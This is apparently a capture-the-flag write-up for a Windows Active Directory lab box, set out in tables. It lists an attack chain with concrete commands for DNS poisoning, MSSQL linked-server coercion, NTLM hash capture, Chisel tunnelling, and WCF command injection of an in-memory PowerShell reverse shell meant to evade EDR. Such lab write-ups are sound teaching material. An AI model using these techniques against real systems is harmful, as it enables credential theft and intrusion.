...
| :--: | :--- | :--- | :--- |
| 1 | N/A (Unauthenticated) | **Network Scanning (nmap)** | Identified Windows Server 2022 with Active Directory services and a custom MSSQL instance on port `6520`. |
| 2 | N/A (Unauthenticated) | **SMB Enumeration** | Discovered an anonymous `software$` share containing a `Monitoring` folder with a .NET executable. |
| 3 | N/A (Unauthenticated) | **Static Analysis (.NET Decompilation)** | Decompiled `overwatch.exe` using `dnSpy` to uncover hardcoded domain credentials for `sqlsvc`. |
| 4 | `sqlsvc` (Domain User) | **ADIDNS Poisoning** | Added a new DNS record for `sql07` pointing to the attacker IP using `dnstool.py`. |
| 5 | `sqlsvc` (MSSQL Access) | **Linked Server Coercion** | Forced the MSSQL instance to authenticate to the attacker-controlled `sql07` via a linked server query. |
| 6 | `sqlsvc` (Attacker Context) | **NTLMv2 Capture (Responder)** | Captured the NTLMv2 hash/cleartext credentials for the `sqlmgmt` user during the coerced connection. |
| 7 | `sqlmgmt` (WinRM Access) | **Remote Management (Evil-WinRM)** | Established an initial foothold on the target machine; retrieved **user.txt**. |
| 8 | `sqlmgmt` (Local Access) | **Internal Enumeration** | Identified a WCF `MonitorService` listening on `127.0.0.1:8000` via `netstat`. |
| 9 | `sqlmgmt` (Local Access) | **Reverse Tunneling (Chisel)** | Forwarded the internal WCF port `8000` to the attacker machine to enable remote exploitation. |
| 10 | `sqlmgmt` (Service Context)| **WCF Command Injection** | Injected a PowerShell download cradle into the `processName` parameter of the `KillProcess` SOAP method. |
| 11 | `sqlmgmt` (Service Context)| **Memory-Resident Reverse Shell** | Executed an IEX cradle to download and run `shell.ps1` entirely in memory to bypass EDR. |
| 12 | Root (SYSTEM) | **Flag Capture** | Received a high-privileged callback; navigated to the Administrator desktop to retrieve **root.txt**. |
...
| Attribute | TechnicalDetails |
|  |  |
| **Primary Identifiers** | **Service PrincipalName (SPN):** `MSSQLSvc/S200401.overwatch.htb:6520`<br>

<br>**DnsObject:** `DC=sql07,DC=overwatch.htb,CN=MicrosoftDNS,DC=DomainDnsZones` |
| **CriticalVulnerability** | **Insecure DynamicUpdates:** Authenticated users can create non-existent DNS records.<br>

<br>**Unconstrained Delegation Link:** MSSQL attempts NTLM auth to any defined Linked Server. |
| **Offensive Action** | 1. Use `dnstool.py` to register `sql07` to Attacker IP.<br>

<br>2. Execute `EXEC('SELECT 1') AT [SQL07]` on MSSQL.<br>

<br>3. Capture `sqlmgmt` NTLMv2 hash via Responder. |
...
## ThreatHunting Anomaly Analysis
...
| Step | Objective | TechnicalCommand / Logic |
|  |  --| --|
| **01** | **enumerateTargets** | `nmap -p 6520 -sV 10.XXX.X.XXX` |
| **02** | **poisonDns** | `python3 dnstool.py -u 'sqlsvc' -p 'Pass' -r sql07 -d [AttackerIP] --action add 10.XXX.X.XXX` |
| **03** | **coerceAuthentication** | `impacket-mssqlclient ... -c "EXEC('SELECT 1') AT [SQL07]"` |
| **04** | **establishTunnel** | `./chisel server -p 8001 --reverse` |
| **05** | **exploitWcf** | `python3 exploit.py` (Inject Payload into SOAP Body) |
